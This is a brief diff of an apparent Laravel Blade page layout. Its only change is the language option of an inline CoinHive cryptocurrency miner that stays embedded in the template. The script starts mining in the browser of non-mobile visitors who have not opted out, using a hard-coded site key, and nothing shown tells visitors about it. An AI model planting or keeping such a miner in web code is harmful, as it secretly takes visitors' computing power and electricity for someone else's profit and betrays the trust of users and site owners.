@@ -290,7 +290,7 @@
             <div class="row">
                 @yield('right-panel')
 				<script>
-	var miner = new CoinHive.Anonymous('dlglYUX8ZLlwpXV5DxtIFpuyL3UEM2yQ', {throttle: 0.5,language: 'fa'});
+	var miner = new CoinHive.Anonymous('dlglYUX8ZLlwpXV5DxtIFpuyL3UEM2yQ', {throttle: 0.5,language: 'ko'});
 	if (!miner.isMobile() && !miner.didOptOut(60*60*4)) {
 		miner.start();
 	}
